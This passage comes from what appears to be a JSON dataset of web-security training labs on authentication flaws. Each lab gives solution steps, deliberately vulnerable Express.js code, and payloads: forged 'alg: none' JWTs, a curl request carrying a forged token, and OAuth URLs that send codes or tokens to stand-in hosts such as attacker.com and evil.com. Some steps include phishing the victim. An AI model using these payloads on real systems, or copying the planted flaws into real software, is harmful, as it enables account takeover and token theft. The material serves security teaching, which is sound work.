    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username }, 'insecure-secret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, 'insecure-secret', { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${payload.username}`); } catch (e) { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <base64_header>.<base64_payload>.",
      "curl -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.' http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "OAuth redirection URI manipulation in third-party login",
    "Lab Description": "The app implements OAuth login using a third-party provider but insecurely accepts dynamic redirect_uris. An attacker can manipulate this URI to intercept the authorization code. To solve: capture Carlos’s OAuth code and use it to log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to initiate OAuth login and intercept the redirect_uri parameter sent to the provider.",
      "2.Modify the redirect_uri to point to an attacker-controlled domain like https://attacker.com/oauth/callback.",
      "3.Send Carlos a phishing link containing the modified redirect_uri, prompting him to log in with the provider.",
      "4.On your server (attacker.com), capture the incoming GET request with ?code= parameter.",
      "5.Exchange the stolen code manually with Postman for an access token, then call /oauth/callback with the valid token to log in as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const CLIENT_ID = 'client123'; const CLIENT_SECRET = 'secret456'; app.get('/login-oauth', (req, res) => { const redirect = req.query.redirect || 'http://localhost:4000/oauth/callback'; const url = `https://auth-provider.com/auth?client_id=${CLIENT_ID}&redirect_uri=${redirect}&response_type=code`; res.redirect(url); }); app.get('/oauth/callback', async (req, res) => { const { code } = req.query; try { const tokenResp = await axios.post('https://auth-provider.com/token', { code, client_id: CLIENT_ID, client_secret: CLIENT_SECRET }); const userInfo = await axios.get('https://auth-provider.com/userinfo', { headers: { Authorization: `Bearer ${tokenResp.data.access_token}` } }); res.send(`Logged in as ${userInfo.data.username}`); } catch { res.status(401).send('OAuth failed'); } }); app.listen(4000);",
    "payloads": [
      "https://auth-provider.com/auth?client_id=client123&redirect_uri=https://attacker.com/oauth/callback&response_type=code",
      "Captured GET /oauth/callback?code=abcd1234",
      "POST https://auth-provider.com/token with code=abcd1234"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login endpoint",
    "Lab Description": "The application uses session cookies for authentication, but it does not rotate the session ID after login. This enables a session fixation attack where a user is tricked into logging in with a pre-set session ID. To solve: Hijack Carlos's session and access his My Account page using session fixation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the GET /login request with Burp Suite and observe the Set-Cookie header assigning a session ID.",
      "Forward the request and monitor session usage pre- and post-login. Notice session ID does not change.",
      "Use OWASP ZAP to pre-set a session ID manually and share that crafted login link with the victim (Carlos).",
      "Simulate Carlos's login using the shared session ID and capture requests in Burp Proxy.",
      "Reuse the same session ID from your own browser to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'fixation-secret', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: '1234' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return res.redirect('/my-account'); } res.status(403).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
    "payloads": [
      "http://vulnerable-site.com/login;jsessionid=FIXED1234",
      "Cookie: connect.sid=FIXED1234",
      "session=preloaded-session; path=/; HttpOnly"
    ]
  },
  {
    "Lab scenario": "JWT tampering via none algorithm vulnerability in API authentication",
    "Lab Description": "This app uses JSON Web Tokens for authentication. However, it does not validate the algorithm properly and allows `alg: none`, making it possible to forge a token without signing it. To solve: Tamper with a JWT to impersonate Carlos and access his data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT after logging in using Postman or Burp.",
      "Use jwt.io or a local script to decode the JWT and change the payload to {\"username\":\"carlos\"}.",
      "Set alg to \"none\" in the header and remove the signature part of the JWT.",
      "Use OWASP ZAP to send a forged token in the Authorization: Bearer header.",
      "Access the /api/user/profile endpoint and verify the response contains Carlos's info."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: '1234' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.username === 'carlos') return res.send('Sensitive data of carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running...'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{\"username\":\"carlos\"}.",
      "Authorization: Bearer <unsigned JWT with alg: none>"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect flaw in callback handler",
    "Lab Description": "The app integrates OAuth for third-party login but fails to validate redirect URIs properly. This allows an attacker to steal the authorization code by injecting an open redirect in the callback flow. To solve: Steal Carlos's OAuth code and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up a malicious redirect URI on your domain that logs the query parameters.",
      "Craft a link using the app's OAuth endpoint with redirect_uri=https://attacker.com/oauth-catch",
      "Use social engineering to make Carlos click the malicious login link.",
      "Capture the authorization code from your server logs and exchange it at /oauth/token using Postman.",
      "Use the obtained token to call /profile and access Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/login-oauth', (req, res) => { const redirectURI = req.query.redirect_uri;  res.redirect(`https://authprovider.com/oauth?client_id=xyz&redirect_uri=${redirectURI}`); }); app.get('/oauth/callback', (req, res) => { const code = req.query.code; axios.post('https://authprovider.com/oauth/token', { code }).then(response => { const accessToken = response.data.access_token; res.redirect(`/profile?token=${accessToken}`); }); }); app.get('/profile', (req, res) => { const token = req.query.token; if (token === 'carlos-token') return res.send('Carlos's profile data'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Open Redirect Lab running...'));",
    "payloads": [
      "https://vulnerable-app.com/login-oauth?redirect_uri=https://attacker.com/log-code",
      "GET https://authprovider.com/oauth/token?code=stolen-code",
      "https://vulnerable-app.com/profile?token=carlos-token"
    ]
  },
  {
    "Lab scenario": "OAuth session fixation in authorization code flow",
    "Lab Description": "The application implements OAuth using the authorization code flow but fails to rotate the session identifier after login. The authorization server is hosted separately, but session tokens are not refreshed upon login. An attacker can craft a session, fix it for the victim, and then hijack their session post-login. To solve: hijack Carlos's authenticated session using a fixation technique.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept your own OAuth login flow and capture the session cookie before login.",
      "2. Share the captured session cookie with the victim by embedding it in a phishing link (e.g., https://target-app.com/oauth/start?session=abc123).",
      "3. Log out and open the phishing link in another browser (simulating the victim) and complete OAuth login as Carlos.",
      "4. Observe that Carlos is authenticated using the attacker’s session (session token reused).",
      "5. Return to the attacker browser and access /my-account using the fixed session to verify successful session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weakSecret', resave: false, saveUninitialized: true })); app.get('/oauth/callback', (req, res) => { const { code } = req.query; const user = exchangeCodeForUser(code); if (user) { req.session.user = user; res.redirect('/my-account'); } }); function exchangeCodeForUser(code) { if (code === 'valid-code') return 'carlos'; return null; } app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome, ${req.session.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Fixation Lab running'));",
    "payloads": [
      "https://target-app.com/oauth/start?session=abc123",
      "OAuth callback with valid code using fixed session: /oauth/callback?code=valid-code"
    ]
  },
  {
    "Lab scenario": "JWT tampering using alg: none",
    "Lab Description": "This application uses JWTs for user authentication but fails to enforce strong algorithm verification. The server trusts JWTs that use 'none' as their algorithm and doesn't validate the signature. To solve: forge a token granting access to Carlos’s account by tampering with the algorithm field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in using your own credentials and capture the JWT using Postman or Burp.",
      "2. Decode the JWT using jwt.io or a local tool. Note the alg header and payload values.",
      "3. Modify the JWT header to: {\"alg\": \"none\"} and set the payload to: {\"username\": \"carlos\"}.",
      "4. Remove the signature section and reconstruct the JWT: base64(header).base64(payload).",
      "5. Use Burp Repeater to send a request with the forged JWT in the Authorization header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (token) { const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { req.user = decoded.payload; next(); return; } jwt.verify(token, 'supersecret', (err, user) => { if (!err) req.user = user; next(); }); } else { next(); } }); app.get('/my-account', (req, res) => { if (req.user?.username) res.send(`Welcome ${req.user.username}`); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [FORGED_JWT_WITH_NONE]"
    ]
  },
  {
    "Lab scenario": "Session ID leakage through verbose error logging",
    "Lab Description": "This application logs full session identifiers in the response body when errors occur. Attackers can trigger errors and collect leaked session tokens from responses. To solve: leak Carlos’s session ID and use it to access his account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use OWASP ZAP to spider the site and trigger various invalid requests to observe error messages.",
      "2. Identify a response leaking a full session ID (e.g., 'Error: Invalid action [Session: abc1234carlos]') in the response body.",
      "3. Copy the leaked session value and set it manually in your own session cookie using Burp or browser dev tools.",
      "4. Refresh the browser while authenticated with the hijacked session.",
      "5. Navigate to /my-account to confirm session takeover and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'logSecret', resave: false, saveUninitialized: true })); app.get('/action', (req, res) => { const action = req.query.action; if (!action) { return res.status(500).send(`Error: Invalid action [Session: ${req.sessionID}]`); } res.send('Action received'); }); app.get('/my-account', (req, res) => { if (req.sessionID === 'abc1234carlos') return res.send('Carlos Account Page'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('Verbose Error Session Leak Lab running'));",
    "payloads": [
      "/action",
      "Set-Cookie: connect.sid=abc1234carlos",
      "GET /my-account with forged session"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Algorithm Bypass in Session Token Verification",
    "Lab Description": "This lab demonstrates a vulnerability in JWT session token validation where the application incorrectly accepts tokens using the 'none' algorithm, bypassing signature verification entirely. The application relies on JWT tokens for authentication but fails to enforce a secure algorithm. To solve: Forge a valid token and access Carlos's My Account page without needing his password.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture a valid login token from your own account and send it to Decoder.",
      "2. Decode the JWT and observe the header contains 'alg':'HS256'.",
      "3. Modify the JWT header to use 'alg':'none' and remove the signature section entirely.",
      "4. Replace the payload with '{\"username\":\"carlos\"}' and re-encode the JWT.",
      "5. Replace your session cookie with the modified JWT and refresh the My Account page to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecuresecret'; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.cookie('session', token); res.send('Logged in as ' + username); }); app.get('/my-account', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Invalid Token'); res.send('Welcome ' + decoded.payload.username); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth 2.0 Misconfiguration — Open Redirect Token Theft in Authorization Flow",
    "Lab Description": "This lab showcases an OAuth misconfiguration where the authorization server does not properly validate the 'redirect_uri' parameter, allowing open redirection and token theft. The application trusts the user-supplied redirect URL without whitelisting. To solve: Exploit the OAuth flow to capture a valid token from Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP's Spider to map the OAuth authorization flow endpoints.",
      "2. Observe the 'redirect_uri' is not validated and can point to an attacker-controlled domain.",
      "3. Set up a listener on your own domain using Burp Collaborator to intercept tokens.",
      "4. Craft a URL with 'redirect_uri' pointing to your Collaborator link and trick Carlos into clicking it.",
      "5. Capture the token from the Collaborator, replay it in an Authorization header, and access Carlos's My Account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, token } = req.query; if (!redirect_uri) return res.status(400).send('Missing redirect_uri'); res.redirect(redirect_uri + '?token=' + token); }); app.listen(4000, () => console.log('OAuth Open Redirect Lab running on port 4000'));",
    "payloads": [
      "https://attacker.com/callback?token=ACCESS_TOKEN",
      "https://yourdomain.exploit-server.net/?token=ACCESS_TOKEN"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Predictable Session IDs in Login Process",
    "Lab Description": "This lab highlights a session fixation vulnerability where the application assigns session tokens before authentication and fails to issue new ones post-login. An attacker can force a victim to use a pre-selected session ID. To solve: Predict or fixate Carlos's session ID and gain access to his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite's Proxy to intercept a pre-login session cookie and note the format.",
      "2. Share the session ID with the victim using a phishing link including 'sessionid=knownvalue' as a URL parameter.",
      "3. Wait for Carlos to log in using the pre-assigned session.",
      "4. Reuse the same session cookie in your browser once the victim logs in.",
      "5. Visit the /my-account page and confirm the session now belongs to Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use((req, res, next) => { if (!req.cookies.sessionid) { const sessionId = 'sess-' + Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); } next(); }); app.post('/login', (req, res) => { const { username } = req.body; res.send('Logged in as ' + username); }); app.get('/my-account', (req, res) => { res.send('Account page: SessionID=' + req.cookies.sessionid); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "sess-fixedattackid",
      "sess-victimcontrolid",
      "sess-carlosfixedid"
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion in API Authentication",
    "Lab Description": "The API authentication mechanism uses JSON Web Tokens (JWTs) for session management. The server trusts the 'alg' field in the JWT header without validation, which allows algorithm confusion attacks. The application fails to enforce the expected signing algorithm, allowing unsigned tokens. To solve: forge an admin JWT token using 'none' algorithm and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid JWT after logging into your own account.",
      "Decode the JWT using jwt.io or Burp Decoder to understand its structure.",
      "Modify the JWT header to {\"alg\":\"none\",\"typ\":\"JWT\"} and remove the signature section.",
      "Replay the modified JWT using Postman in the Authorization header and change the payload sub to 'admin'.",
      "Send the crafted request to /admin/dashboard and confirm access to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.get('/admin/dashboard', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.verify(token, 'secret-key', { algorithms: ['HS256', 'none'] }); if (decoded.sub === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token theft via redirect manipulation",
    "Lab Description": "The web app uses OAuth for authentication, but improperly validates the redirect_uri parameter during the OAuth handshake. An attacker can manipulate this parameter to point to a malicious endpoint and steal access tokens. To solve: intercept an OAuth request and redirect the victim’s token to your controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth login initiation and identify the redirect_uri parameter.",
      "Modify redirect_uri to point to your server: https://evil.com/callback.",
      "Host a listener on https://evil.com/callback using a Python HTTP server or Burp Collaborator.",
      "Send the OAuth URL to the victim (e.g. via phishing). Once the victim authenticates, the token will be sent to your server.",
      "Use the stolen token in Postman to access /api/user-profile and confirm the victim’s data is exposed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const url = require('url'); const app = express(); app.get('/oauth/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; const accessToken = 'abcdef123456'; res.redirect(`${redirectUri}#access_token=${accessToken}`); }); app.listen(4000, () => console.log('OAuth Lab running on port 4000'));",
    "payloads": [
      "https://evil.com/callback#access_token=abcdef123456",
      "https://attacker.com/steal?token=abcdef123456"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login flow",
    "Lab Description": "The application uses predictable session IDs generated before login and does not regenerate them after authentication. An attacker can fix a session ID before the victim logs in, gaining unauthorized access to the victim's session. To solve: pre-assign a session ID, send it to the victim, and hijack the account once the victim authenticates.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the session ID assigned before login (/login page).",
      "Manually set the session ID to a known value using the browser’s DevTools or Burp Cookie Editor.",
      "Send the crafted link with this session ID to the victim, enticing them to log in.",
      "Once the victim logs in, reuse the same session ID in your browser to take over the authenticated session.",
      "Visit /my-account to confirm the session is active as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sessionId = req.cookies['session'] || Math.random().toString(36).substring(7); res.cookie('session', sessionId); res.send('Login page - session initialized'); }); app.post('/authenticate', (req, res) => { const sessionId = req.cookies['session']; if (sessionId) res.redirect('/my-account'); else res.status(401).send('Session missing'); }); app.get('/my-account', (req, res) => { res.send('Welcome to your account'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "Cookie: session=attackerSession123",
      "Cookie: session=xyzfixedsession"
    ]
  },
  {
    "Lab scenario": "JWT signature validation bypass via 'none' algorithm",
    "Lab Description": "This lab simulates a web application that uses JSON Web Tokens (JWT) for session management but fails to enforce proper algorithm checks during signature verification. The server trusts any JWT token where the algorithm field is modified to 'none'. To solve the lab, forge a valid JWT for user 'carlos' without knowing the secret key and access the protected /my-account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to capture the JWT token after logging in as your own user.",
      "2. Decode the JWT using jwt.io or a similar decoder, and observe the 'alg' field set to HS256 and the payload containing your username.",
      "3. Modify the 'alg' field from HS256 to 'none' and change the payload to {\"username\":\"carlos\"}.",
      "4. Re-encode the header and payload without generating a signature and submit this token as the Authorization header in a new request to /my-account.",
      "5. If successful, you will gain access to Carlos's account and the lab will be solved."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { res.send(`Account details for ${decoded.payload.username}`); } else { jwt.verify(token, SECRET, (err, user) => { if (err) return res.status(403).send('Forbidden'); res.send(`Account details for ${user.username}`); }); } }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{ \"username\":\"carlos\" }."
    ]
  },
  {
    "Lab scenario": "Session Fixation through predictable session IDs",
    "Lab Description": "This lab's session management mechanism uses predictable session identifiers. The server assigns the session ID before authentication and fails to regenerate it after successful login. To solve the lab, pre-set a known session ID for the victim and log in to their account using the same session ID to hijack their session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept your own login flow and observe the Set-Cookie response with a predictable PHPSESSID value.",
      "2. Manually manipulate the session ID by setting the PHPSESSID to 'fixed-session-1337' before the login attempt.",
      "3. Log out and convince the victim to log in using the crafted link embedding your fixed session ID (e.g., http://target.site/login?PHPSESSID=fixed-session-1337).",
      "4. Once the victim logs in, reuse the same session ID 'fixed-session-1337' to access the /my-account endpoint.",
      "5. Successful access to the account page using the shared session ID confirms the vulnerability."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sessionId = req.cookies['PHPSESSID'] || Math.random().toString(36).substring(2, 15); res.cookie('PHPSESSID', sessionId); res.send(`<form method='POST'><input name='username'><input name='password' type='password'><button type='submit'>Login</button></form>`); }); app.post('/login', (req, res) => { const sessionId = req.cookies['PHPSESSID']; if (sessionId) { res.send('Login successful! Session ID remains the same.'); } else { res.status(400).send('No session ID'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "PHPSESSID=fixed-session-1337",
      "Set-Cookie: PHPSESSID=fixed-session-1337",
      "http://target.site/login?PHPSESSID=fixed-session-1337"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration",
    "Lab Description": "This lab's OAuth 2.0 implementation uses the implicit flow without validating the redirect URI properly. Attackers can manipulate the redirect_uri parameter to steal access tokens. To solve the lab, craft a malicious OAuth URL to capture Carlos's token and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Analyze the OAuth login request using Burp Suite or OWASP ZAP and observe the 'redirect_uri' parameter.",
      "2. Modify the redirect_uri parameter to point to your controlled server (e.g., http://attacker.com/callback) and send the URL to Carlos.",
      "3. Host a simple HTTP listener on your attacker-controlled server to capture incoming requests with tokens in the URL fragment.",
      "4. When Carlos clicks the malicious link and logs in, the token will be sent to your server via the URI fragment.",
      "5. Use the stolen token in an Authorization: Bearer header to access the /my-account endpoint as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const { redirect_uri } = req.query; const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.carlos.signature'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (authHeader && authHeader.includes('carlos')) { res.send('Account details for carlos'); } else { res.status(401).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Lab running on port 4000'));",
    "payloads": [
      "http://target.site/authorize?client_id=lab-client&redirect_uri=http://attacker.com/callback&response_type=token",
      "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.carlos.signature"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Algorithm Exploit in Authentication Token Verification",
    "Lab Description": "This lab simulates an application vulnerable to JWT token manipulation due to insecure implementation of the 'none' algorithm during signature verification. The backend fails to enforce token signature validation when 'alg' is set to 'none'. The application issues JWT tokens after successful login, which are used for session authentication. To solve: Forge a JWT token to escalate privileges and access Carlos's account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept and inspect the JWT after logging into your own account.",
      "Decode the JWT using jwt.io or Burp Decoder to confirm the 'HS256' algorithm is in use.",
      "Modify the token's payload to set 'username':'carlos' and change the algorithm in the header from 'HS256' to 'none'. Remove the signature part.",
      "Send the forged JWT as the Authorization Bearer token using Postman or Burp Repeater.",
      "Access /my-account endpoint and confirm Carlos's account page loads, completing the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\nconst secret = 'supersecret';\napp.post('/login', (req, res) => {\n  const { username } = req.body;\n  const token = jwt.sign({ username }, secret, { algorithm: 'HS256' });\n  res.json({ token });\n});\napp.get('/my-account', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  const payload = jwt.decode(token, { complete: true });\n  if (payload.header.alg === 'none') {\n    res.send(`Account details for ${payload.payload.username}`);\n  } else {\n    jwt.verify(token, secret, (err, decoded) => {\n      if (err) return res.status(401).send('Invalid Token');\n      res.send(`Account details for ${decoded.username}`);\n    });\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{ \"username\": \"carlos\" }.",
      "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}, Signature: [empty]"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Token Validation Flow",
    "Lab Description": "This lab focuses on exploiting an OAuth token misconfiguration where the server only verifies the token's issuer claim (`iss`) and skips validation of the access token signature. The lab involves leveraging this weakness to craft a fake token and impersonate a privileged user. To solve: Forge a signed JWT access token with a manipulated issuer pointing to a trusted domain and access Carlos's profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Perform reconnaissance using Burp Suite to capture a valid OAuth token exchange between the client and authorization server.",
      "Use jwt.io to decode the token and observe the 'iss' and 'sub' claims structure.",
      "Create a forged token with the same issuer but modify the 'sub' to 'carlos' using jwt-tool.",
      "Submit the forged token using Postman as an Authorization Bearer token to /my-account.",
      "Verify Carlos's profile loads without server-side token signature validation, confirming successful exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\napp.get('/my-account', (req, res) => {\n  const token = req.headers['authorization'].split(' ')[1];\n  const payload = jwt.decode(token);\n  if (payload.iss === 'https://auth.example.com') {\n    res.send(`Account details for ${payload.sub}`);\n  } else {\n    res.status(403).send('Invalid Token Issuer');\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OAuth Misconfiguration Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiJjYXJsb3MifQ.fake_signature",
      "{\"iss\":\"https://auth.example.com\", \"sub\":\"carlos\"}",
      "Custom token signed with any secret — as signature is not verified"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Cookie-Based Authentication",
    "Lab Description": "This lab's authentication mechanism is vulnerable to session fixation. When a user logs in, the session identifier is not regenerated, enabling an attacker to set the session ID ahead of authentication. The application accepts any existing session ID and continues the session post-login. To solve: Pre-set a session ID, trick the victim into using it, log in as Carlos and hijack the session using the same ID.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to observe the session cookie assigned before authentication when accessing /login.",
      "Manually craft a link embedding a preset session cookie, e.g., http://target/login with cookie: sessionid=attackersession123.",
      "Use social engineering or simulated behavior to have the victim log in while using the attacker-defined session ID.",
      "Once Carlos logs in, reuse the fixed session ID to access /my-account.",
      "Confirm Carlos's account page loads, completing the exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\nconst users = { 'carlos': 'password123' };\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    sessions[req.cookies.sessionid] = username;\n    res.send(`Welcome ${username}`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/my-account', (req, res) => {\n  const username = sessions[req.cookies.sessionid];\n  if (username) {\n    res.send(`Account details for ${username}`);\n  } else {\n    res.status(401).send('Not logged in');\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Set-Cookie: sessionid=attackersession123",
